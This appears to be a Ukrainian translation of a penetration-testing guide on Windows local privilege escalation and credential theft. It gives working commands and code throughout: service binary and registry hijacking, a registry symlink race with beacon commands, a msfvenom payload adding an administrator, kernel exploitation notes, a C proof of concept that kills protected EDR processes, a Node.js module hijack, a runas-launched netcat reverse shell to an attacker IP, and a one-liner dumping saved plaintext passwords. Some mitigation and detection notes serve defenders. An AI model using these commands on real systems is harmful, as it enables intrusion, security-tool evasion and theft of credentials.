### Слабкі дозволи бінарних файлів служб

Якщо служба працює як **`LocalSystem`**, **`LocalService`**, **`NetworkService`** або привілейований доменний обліковий запис, але **користувачі з низькими привілеями можуть змінювати EXE служби або її батьківську папку**, службу часто можна захопити, **замінивши бінарний файл і перезапустивши службу**.

**Перевірте, чи можете ви змінювати бінарний файл, який запускається службою**, або чи маєте **дозволи на запис до папки**, де розташований бінарний файл ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
Ви можете отримати кожен бінарний файл, який запускається службою, за допомогою **wmic** (не в system32), а потім перевірити свої дозволи за допомогою **icacls**:
```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
Також можна використовувати **sc** та **icacls**:
```bash
sc qc <service_name>
icacls "C:\path\to\service.exe"

sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
Перевіряйте наявність небезпечних ACL, наданих **`Everyone`**, **`BUILTIN\Users`** або **`Authenticated Users`**, особливо **`(F)`**, **`(M)`** або **`(W)`** для виконуваного файлу служби чи каталогу, що його містить. Практичний сценарій зловживання:<sup>[[27]](#references)</sup>

1. Підтвердьте обліковий запис служби та шлях до виконуваного файлу за допомогою `sc qc <service_name>`.
2. Підтвердьте, що бінарний файл доступний для запису, за допомогою `icacls <path>`.
3. Замініть бінарний файл служби на payload або дійсний шкідливий бінарний файл служби.
4. Перезапустіть службу за допомогою `sc stop <service_name> && sc start <service_name>` (або дочекайтеся перезавантаження / тригера служби).

Корисні автоматизовані перевірки:<sup>[[28]](#references)</sup>
```powershell
. .\PowerUp.ps1
Get-ModifiableServiceFile -Verbose

SharpUp.exe audit ModifiableServiceBinaries
. .\PrivescCheck.ps1
Invoke-PrivescCheck -Extended -Audit
```
> Якщо служба не дозволяє звичайному користувачеві перезапустити її, перевірте, чи запускається вона автоматично під час завантаження, чи має дію у разі збою, яка повторно запускає її, або чи можна опосередковано запустити її через програму, що використовує цю службу.

### Дозволи на зміну реєстру служб

Перевірте, чи можете ви змінювати реєстр будь-якої служби.\
Ви можете **перевірити** свої **дозволи** щодо **реєстру** служби за допомогою:
```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
Потрібно перевірити, чи мають **Authenticated Users** або **NT AUTHORITY\INTERACTIVE** дозволи `FullControl`. Якщо так, бінарний файл, який запускається службою, можна змінити.

Щоб змінити Path бінарного файлу, який запускається:
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### Гонка з symlink у реєстрі для довільного запису значення HKLM (ATConfig)

Деякі функції спеціальних можливостей Windows створюють користувацькі ключі **ATConfig**, які згодом копіюються процесом **SYSTEM** до ключа сеансу в HKLM. **Символічна link-гонка** в реєстрі може перенаправити цей привілейований запис до **будь-якого шляху HKLM**, надаючи примітив **запису довільного значення** в HKLM.<sup>[[18]](#references)</sup>

Ключові розташування (приклад: екранна клавіатура `osk`):

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs` містить список встановлених функцій спеціальних можливостей.
- `HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\<feature>` зберігає контрольовану користувачем конфігурацію.
- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\<feature>` створюється під час входу в систему або переходів до захищеного робочого столу та доступний користувачу для запису.

Процес експлуатації (CVE-2026-24291 / ATConfig):

1. Заповніть значення **HKCU ATConfig**, яке має бути записане процесом SYSTEM.
2. Запустіть копіювання до захищеного робочого столу (наприклад, **LockWorkstation**), що запускає процес AT broker.
3. **Виграйте гонку**, встановивши **oplock** на `C:\Program Files\Common Files\microsoft shared\ink\fsdefinitions\oskmenu.xml`; коли спрацює oplock, замініть ключ **HKLM Session ATConfig** на **registry link**, що вказує на захищену ціль HKLM.
4. SYSTEM запише вибране атакувальником значення до перенаправленого шляху HKLM.

Отримавши можливість довільного запису значень HKLM, виконайте LPE шляхом перезапису значень конфігурації служб:

- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\ImagePath` (EXE/command line)
- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\Parameters\ServiceDll` (DLL)

Виберіть службу, яку звичайний користувач може запустити (наприклад, **`msiserver`**), і запустіть її після запису. **Примітка:** публічна реалізація exploit **блокує робочу станцію** як частину гонки.

Приклади інструментів (RegPwn BOF / standalone):<sup>[[19]](#references)</sup>
```bash
beacon> regpwn C:\payload.exe SYSTEM\CurrentControlSet\Services\msiserver ImagePath
beacon> regpwn C:\evil.dll SYSTEM\CurrentControlSet\Services\SomeService\Parameters ServiceDll
net start msiserver
```
### Дозволи реєстру служб AppendData/AddSubdirectory

Якщо у вас є цей дозвіл для реєстру, це означає, що **ви можете створювати підреєстри з цього реєстру**. У випадку служб Windows цього **достатньо для виконання довільного коду:**


{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Unquoted Service Paths

Якщо шлях до виконуваного файлу не взято в лапки, Windows спробує виконати кожну частину шляху до пробілу.

Наприклад, для шляху _C:\Program Files\Some Folder\Service.exe_ Windows спробує виконати:
```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```
Перелічіть усі шляхи служб без лапок, за винятком тих, що належать до вбудованих служб Windows:
```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
**Ви можете виявити та використати** цю вразливість за допомогою metasploit: `exploit/windows/local/trusted\_service\_path` Ви можете вручну створити бінарний файл служби за допомогою metasploit:
```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### Дії відновлення

Windows дозволяє користувачам указувати дії, які потрібно виконати в разі збою служби. Цю функцію можна налаштувати так, щоб вона вказувала на binary. Якщо цей binary можна замінити, може бути можливе підвищення привілеїв. Докладнішу інформацію наведено в [офіційній документації](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>).

## Applications

### Встановлені Applications

Перевірте **дозволи для binary** (можливо, ви зможете перезаписати один із них і підвищити привілеї) та **папок** ([DLL Hijacking](dll-hijacking/index.html)).
```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
### Права на запис

Перевірте, чи можете ви змінити певний config file, щоб прочитати спеціальний файл, або змінити binary, який буде виконано обліковим записом Administrator (schedtasks).

Один зі способів знайти слабкі дозволи для папок/файлів у системі — виконати:
```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
### Автозавантаження плагінів Notepad++ для persistence/виконання

Notepad++ автоматично завантажує будь-яку DLL плагіна з підпапок `plugins`. Якщо доступне портативне або скопійоване встановлення з правом запису, розміщення шкідливого плагіна забезпечує автоматичне виконання коду всередині `notepad++.exe` під час кожного запуску (зокрема з `DllMain` і callback-функцій плагіна).

{{#ref}}
notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Запуск під час запуску

**Перевірте, чи можете ви перезаписати певний реєстр або бінарний файл, який буде виконано іншим користувачем.**\
**Прочитайте** **наступну сторінку**, щоб дізнатися більше про цікаві **місця autoruns для підвищення привілеїв**:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Драйвери

Шукайте можливі **сторонні дивні/вразливі** драйвери
```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```
Якщо драйвер надає примітив довільного читання/запису в kernel memory (поширено у погано спроєктованих IOCTL handlers), можна підвищити привілеї, безпосередньо викравши SYSTEM token із kernel memory.<sup>[[13]](#references)</sup> Покрокову техніку наведено тут:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

{{#ref}}
windows-kernel-rootkits-and-dkom.md
{{#endref}}

Для race-condition bugs, коли вразливий виклик відкриває шлях Object Manager, контрольованого атакувальником, навмисне уповільнення lookup (за допомогою компонентів максимальної довжини або глибоких ланцюжків директорій) може збільшити вікно з мікросекунд до десятків мікросекунд:

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

#### Cancel-safe queue UAFs, paged-pool disclosures і I/O ring pivots

Деякі Windows kernel LPE chains можна побудувати з двох окремо слабких bugs: **cancel-safe queue lifetime race**, яка звільняє request/CBD, поки queue lock усе ще утримується, і disclosure типу **lock-release-before-copy**, яка витікає freed paged-pool allocation під час `RtlCopyToUser`.<sup>[[29]](#references)</sup>

Нотатки щодо аудиту та exploitation:

- **Free-under-lock + cancel afterwards**: шукайте success path, який виконує **Acquire -> CompleteRequest/free -> Release**, тоді як cancel path виконує **Acquire -> RemoveIo(stale pointer) -> Release -> CompleteCanceledIo**. Якщо success path досягає `FltCompletePendedPreOperation` / `FltpFreeIrpCtrl` до звільнення CBDQ/CSQ lock, thread, заблокований у `NtCancelIoFileEx -> IopCsqCancelRoutine`, може пізніше продовжити виконання та передати freed `PFLT_CALLBACK_DATA` назад у remove callback драйвера.
- **Reclaim freed queue object** за допомогою paged-pool allocation такого самого розміру, контрольованого атакувальником. `NPFS` Data Queue Entries корисні, оскільки payload і size є контрольованими, а згодом їх можна перевірити за допомогою pipe read/peek operations. Якщо freed object містить list links, перезапишіть їх **циклічним списком fake request nodes у user memory**, щоб драйвер повторно обробляв визначені атакувальником request structures замість завершення на початковому list head.
- **Upgrade a predictable write**: якщо fake request перенаправляє nested context pointer, який використовується bookkeeping writes (timestamps / QPC / refcount-adjacent fields), можна отримати kernel write із **контрольованою адресою, але неконтрольованим значенням**. У такому разі ціллю має бути поле **length/size** розпиленого pool object, а не кінцевий code/data pointer; потім переберіть spray, доки пошкоджений object не забезпечить **out-of-bounds paged-pool read**.
- **Raceable disclosure pattern**: будь-який syscall, що виконує `ptr = obj->Buffer; unlock(obj); RtlCopyToUser(dst, ptr, size)`, є сильним кандидатом. Надійність підвищується, коли атакувальник може збільшити copied buffer (наприклад, додавши багато list/resource entries, які збільшують final allocation size serializer), оскільки довше копіювання розширює вікно для заміни без обов'язкового crash системи.
- **Pointer-rich refill targets**: зареєстровані buffer arrays Windows **I/O ring** є чудовими disclosure targets, оскільки їхній paged-pool size контролюється атакувальником (`8 * regBufferCnt`), а кожен елемент є kernel pointer на `_IOP_MC_BUFFER_ENTRY`. Витягніть один із цих arrays, відновіть оточуючий `IORING_OBJECT`, потім пошкодьте **`RegBuffers`** і **`RegBuffersCount`**, щоб наступні I/O ring operations використовували attacker-forged entries і надавали arbitrary kernel read/write. Якщо єдиний доступний write дає стабільний byte (наприклад, із `KUSER_SHARED_DATA+0x14`), використайте **overlapping unaligned writes**, щоб побудувати user pointer із повторюваним byte, наприклад `0x0101010101010101`, відобразіть його за допомогою `VirtualAlloc` і розмістіть там forged registered-buffer array.<sup>[[30]](#references)</sup>

Корисні debugging indicators:
```text
NtCancelIoFileEx -> IopCsqCancelRoutine -> <driver>!RemoveIo
<driver> success path: Acquire -> CompleteRequest/free -> Release
RtlCopyToUser after releasing the object lock
ExAllocatePool2(..., 8 * regBufferCnt, 'BRrI')-style variable-sized pointer arrays
```
Після отримання довільного читання/запису kernel через пошкоджене I/O ring викрадіть SYSTEM token за допомогою стандартного post-primitive workflow:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

#### Примітиви пошкодження пам’яті registry hive

Сучасні вразливості hive дають змогу формувати детерміновані розкладки, зловживати доступними для запису нащадками HKLM/HKU та перетворювати пошкодження метаданих на переповнення kernel paged-pool без custom driver. Повний ланцюжок описано тут:

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### Confused deputy типів у direct-mode `RtlQueryRegistryValues` через шляхи, контрольовані attacker

Деякі drivers приймають шлях до registry з userland, перевіряють лише те, що це коректний рядок UTF-16, а потім викликають `RtlQueryRegistryValues(RTL_REGISTRY_ABSOLUTE, userPath, ...)` з `RTL_QUERY_REGISTRY_DIRECT`, передаючи вказівник на scalar у stack, наприклад `int readValue`. Якщо `RTL_QUERY_REGISTRY_TYPECHECK` відсутній, `EntryContext` інтерпретується відповідно до **фактичного** типу registry, а не до типу, який очікував developer.

Це створює два корисні примітиви:<sup>[[24]](#references)[[25]](#references)</sup>

- **Confused deputy / oracle**: контрольований attacker абсолютний шлях `\Registry\...` дає змогу driver запитувати вибрані attacker ключі, розкривати їхню наявність через коди повернення/логи та іноді читати значення, до яких caller не мав би прямого доступу.
- **Kernel memory corruption**: destination scalar, наприклад `&readValue`, через помилкову типізацію стає `REG_QWORD`, `UNICODE_STRING` або бінарним буфером визначеного розміру залежно від типу значення registry.

Практичні зауваження щодо exploitation:

- **Windows 8+ mitigation**: якщо запит звертається до **untrusted hive** з `RTL_QUERY_REGISTRY_DIRECT`, але без `RTL_QUERY_REGISTRY_TYPECHECK`, kernel callers аварійно завершуються з `KERNEL_SECURITY_CHECK_FAILURE (0x139)`. Щоб зберегти exploitability, шукайте **attacker-writable keys усередині trusted system hives** замість розміщення значень у `HKCU`.
- **Trusted-hive staging**: використовуйте NtObjectManager для переліку доступних для запису нащадків `\Registry\Machine`, а потім повторіть сканування з дубльованим token із **low-integrity**, щоб знайти ключі, доступні з sandboxed contexts:<sup>[[26]](#references)</sup>
```powershell
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue
$token = Get-NtToken -Primary -Duplicate -IntegrityLevel Low
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue -Token $token
```
- **`REG_QWORD`**: 8-байтовий прямий запис у 4-байтовий `int` пошкоджує сусідні дані стека та може частково перезаписати розташований поруч покажчик callback-функції.
- **`REG_SZ` / `REG_EXPAND_SZ`**: прямий режим очікує, що `EntryContext` вказуватиме на `UNICODE_STRING`. Якщо код спочатку завантажує контрольований атакувальником `REG_DWORD` у скаляр стека, а потім повторно використовує той самий буфер для читання рядка, атакувальник контролює `Length`/`MaximumLength` і частково впливає на покажчик `Buffer`, отримуючи частково контрольований запис у kernel.
- **`REG_BINARY`**: для великих бінарних даних прямий режим розглядає перший `LONG` за адресою `EntryContext` як розмір буфера зі знаком. Якщо попереднє читання `REG_DWORD` залишає від’ємне контрольоване атакувальником значення в повторно використаному скалярі, наступний запит `REG_BINARY` копіює байти атакувальника безпосередньо поверх сусідніх слотів стека, що часто є найпростішим шляхом до повного перезапису покажчика callback-функції.

Сильний шаблон для пошуку: **різнорідні читання з реєстру в одну й ту саму змінну стека без її повторної ініціалізації**. Виконуйте пошук `RTL_REGISTRY_ABSOLUTE`, `RTL_QUERY_REGISTRY_DIRECT`, повторно використаних покажчиків `EntryContext` і шляхів виконання, де перше читання з реєстру визначає, чи відбудеться друге читання.

#### Зловживання відсутністю FILE_DEVICE_SECURE_OPEN в об’єктах пристроїв (LPE + EDR kill)

Деякі підписані сторонні драйвери створюють об’єкт пристрою з надійним SDDL через IoCreateDeviceSecure, але забувають встановити FILE_DEVICE_SECURE_OPEN у DeviceCharacteristics. Без цього прапорця захищений DACL не застосовується, коли пристрій відкривається через шлях, що містить додатковий компонент, що дозволяє будь-якому непривілейованому користувачу отримати handle, використовуючи шлях простору імен на кшталт:<sup>[[14]](#references)</sup>

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (з реального випадку)

Щойно користувач може відкрити пристрій, привілейованими IOCTL, які надає драйвер, можна зловживати для LPE і втручання. Приклади можливостей, зафіксованих на практиці:
- Повертати handles із повним доступом до довільних процесів (крадіжка токенів / SYSTEM shell через DuplicateTokenEx/CreateProcessAsUser).
- Необмежене читання/запис необробленого диска (офлайн-втручання, прийоми забезпечення persistence під час завантаження).
- Завершувати довільні процеси, зокрема Protected Process/Light (PP/PPL), що дозволяє вимикати AV/EDR із user land через kernel.

Мінімальний шаблон PoC (режим користувача):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```
Mitigations для developers
- Завжди встановлюйте FILE_DEVICE_SECURE_OPEN під час створення об'єктів пристроїв, які мають бути обмежені DACL.
- Перевіряйте контекст caller для привілейованих операцій. Додавайте перевірки PP/PPL перед дозволом на завершення процесу або повернення handle.
- Обмежуйте IOCTL (маски доступу, METHOD_*, перевірка вхідних даних) і розглядайте brokered models замість прямого доступу до kernel privileges.

Ідеї для виявлення для defenders
- Відстежуйте відкриття підозрілих імен пристроїв у user-mode (наприклад, \\ .\\amsdk*) і певні послідовності IOCTL, що вказують на зловживання.
- Застосовуйте Microsoft’s vulnerable driver blocklist (HVCI/WDAC/Smart App Control) і підтримуйте власні allow/deny lists.


## PATH DLL Hijacking

Якщо у вас є **права на запис у папку, присутню в PATH**, ви можете отримати можливість hijack DLL, завантажену процесом, і **ескалювати привілеї**.<sup>[[2]](#references)</sup>

Перевірте дозволи всіх папок у PATH:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Щоб отримати більше інформації про те, як зловживати цією перевіркою:


{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## Перехоплення розв’язання модулів Node.js / Electron через `C:\node_modules`

Це варіант **неконтрольованого пошукового шляху у Windows**, який впливає на застосунки **Node.js** і **Electron**, коли вони виконують bare import, наприклад `require("foo")`, а очікуваний модуль **відсутній**.<sup>[[20]](#references)</sup>

Node визначає пакети, піднімаючись деревом каталогів і перевіряючи папки `node_modules` у кожному батьківському каталозі. У Windows цей пошук може досягти кореня диска, тому застосунок, запущений із `C:\Users\Administrator\project\app.js`, може в результаті перевіряти:<sup>[[21]](#references)</sup>

1. `C:\Users\Administrator\project\node_modules\foo`
2. `C:\Users\Administrator\node_modules\foo`
3. `C:\Users\node_modules\foo`
4. `C:\node_modules\foo`

Якщо **користувач із низькими привілеями** може створити `C:\node_modules`, він може розмістити шкідливий `foo.js` (або папку пакета) і чекати, поки **процес Node/Electron із вищими привілеями** спробує розв’язати відсутню залежність. Payload виконується в контексті безпеки процесу-жертви, тому це стає **LPE**, якщо цільовий процес працює від імені адміністратора, із привілейованої запланованої задачі / service wrapper або з автоматично запущеного привілейованого desktop app.

Це особливо поширено, коли:

- залежність оголошена в `optionalDependencies`<sup>[[22]](#references)</sup>
- стороння бібліотека обгортає `require("foo")` у `try/catch` і продовжує роботу в разі помилки
- пакет було видалено зі production builds, пропущено під час пакування або не вдалося встановити
- вразливий `require()` розташований глибоко всередині дерева залежностей, а не в основному коді застосунку

### Пошук вразливих цілей

Використовуйте **Procmon**, щоб підтвердити шлях розв’язання:<sup>[[23]](#references)</sup>

- Фільтр за `Process Name` = виконуваний файл цілі (`node.exe`, EXE-файл Electron app або процес wrapper)
- Фільтр за `Path` `contains` `node_modules`
- Зосередьтеся на `NAME NOT FOUND` і фінальному успішному відкритті в `C:\node_modules`

Корисні шаблони під час code review у розпакованих `.asar`-файлах або вихідному коді застосунку:
```bash
rg -n 'require\\("[^./]' .
rg -n "require\\('[^./]" .
rg -n 'optionalDependencies' .
rg -n 'try[[:space:]]*\\{[[:space:][:print:]]*require\\(' .
```
### Експлуатація

1. Визначте **назву відсутнього пакета** за допомогою Procmon або аналізу вихідного коду.
2. Створіть кореневий каталог пошуку, якщо він ще не існує:
```powershell
mkdir C:\node_modules
```
3. Розмістіть модуль із точно очікуваною назвою:
```javascript
// C:\node_modules\foo.js
require("child_process").exec("calc.exe")
module.exports = {}
```
4. Запустіть застосунок-жертву. Якщо застосунок намагається виконати `require("foo")`, а легітимний модуль відсутній, Node може завантажити `C:\node_modules\foo.js`.

Реальні приклади відсутніх optional modules, які відповідають цьому шаблону, включають `bluebird` і `utf-8-validate`, але **technique** є багаторазово застосовуваною частиною: знайдіть будь-який **missing bare import**, який привілейований Windows-процес Node/Electron буде шукати.

### Ідеї для виявлення та hardening

- Створюйте сповіщення, коли користувач створює `C:\node_modules` або записує туди нові `.js` файли/пакети.
- Виявляйте процеси з високим рівнем цілісності, які читають дані з `C:\node_modules\*`.
- Додавайте всі runtime dependencies до production і перевіряйте використання `optionalDependencies`.
- Перевіряйте сторонній код на наявність шаблонів безшумного виконання `try { require("...") } catch {}`.
- Вимикайте optional probes, якщо бібліотека це підтримує (наприклад, деякі розгортання `ws` можуть уникнути legacy probe для `utf-8-validate` за допомогою `WS_NO_UTF_8_VALIDATE=1`).

## Мережа

### Спільні ресурси
```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### hosts file

Перевірте наявність інших відомих комп’ютерів, жорстко заданих у файлі hosts.
```
type C:\Windows\System32\drivers\etc\hosts
```
### Мережеві інтерфейси та DNS
```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### Відкриті порти

Перевірте **обмежені сервіси** ззовні
```bash
netstat -ano #Opened ports?
```
### Таблиця маршрутизації
```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
### ARP-таблиця
```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```
### Правила Firewall

[**Перегляньте цю сторінку, щоб ознайомитися з командами, пов’язаними з Firewall**](../basic-cmd-for-pentesters.md#firewall) **(перегляд правил, створення правил, вимкнення, вимкнення...)**

Більше[ команд для мережевої розвідки тут](../basic-cmd-for-pentesters.md#network)

### Підсистема Windows для Linux (wsl)
```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
Бінарний файл `bash.exe` також можна знайти в `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe`

Якщо ви отримали користувача root, ви можете прослуховувати будь-який порт (під час першого використання `nc.exe` для прослуховування порту через GUI буде запитано, чи слід дозволити `nc` роботу через firewall).
```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```
Щоб легко запустити bash від імені root, можна спробувати `--default-user root`

Файлову систему `WSL` можна переглянути в папці `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\`

## Облікові дані Windows

### Облікові дані Winlogon
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```
### Credentials manager / Windows vault

From [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)<sup>[[34]](#references)</sup>\
Windows Vault зберігає облікові дані користувачів для серверів, вебсайтів та інших програм, які **Windows** може використовувати для **автоматичної автентифікації користувачів**. Спочатку може здатися, що користувачі можуть зберігати облікові дані для таких сайтів, як Facebook, Twitter або Gmail, і автоматично входити до них через браузери, але це працює не так.

Windows Vault зберігає облікові дані, за допомогою яких Windows може автоматично автентифікувати користувачів. Це означає, що будь-яка **Windows application that needs credentials to access a resource** (сервер або вебсайт) **can make use of this Credential Manager** & Windows Vault і використовувати надані облікові дані замість того, щоб користувачі щоразу вводили ім’я користувача та пароль.

Якщо програми не взаємодіють із Credential Manager, я не думаю, що вони можуть використовувати облікові дані для певного ресурсу. Отже, якщо ваша програма хоче використовувати сховище, вона має якимось чином **взаємодіяти з credential manager і запитувати облікові дані для цього ресурсу** зі сховища, що використовується за замовчуванням.

Use the `cmdkey` to list the stored credentials on the machine.
```bash
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```
Після цього можна використовувати `runas` з опціями `/savecred`, щоб скористатися збереженими обліковими даними. У наведеному нижче прикладі запускається віддалений бінарний файл через SMB-шару.
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
Використання `runas` із наданим набором облікових даних.
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
Зверніть увагу на mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html) або [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1).

### UWP PasswordVault / Credential Locker

Сучасні Windows UWP applications, Microsoft Edge і сучасні системні служби зберігають authentication tokens і plaintext passwords усередині Universal Windows Platform (UWP) `PasswordVault` (також доступне як `Web Credentials` у `vaultcmd`). Це сховище ізольоване на рівні сесії, а його дані можна розшифрувати нативними засобами без адміністративних прав або прав `SeDebugPrivilege`.

Виконайте цю PowerShell command в активній сесії користувача, щоб миттєво отримати та розшифрувати всі збережені usernames і plaintext passwords:
```ps1
[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]; $v = New-Object Windows.Security.Credentials.PasswordVault; $v.RetrieveAll() | ForEach-Object { try { $_.RetrievePassword(); $_ } catch {} } | Select-Object Resource, UserName, Password | Format-List
```
### DPAPI

**Data Protection API (DPAPI)** надає метод симетричного шифрування даних, який переважно використовується в операційній системі Windows для симетричного шифрування асиметричних приватних ключів. Це шифрування використовує секрет користувача або системи, який значно впливає на ентропію.

**DPAPI забезпечує шифрування ключів за допомогою симетричного ключа, похідного від секретів входу користувача**. У сценаріях, що стосуються системного шифрування, використовуються секрети доменної автентифікації системи.

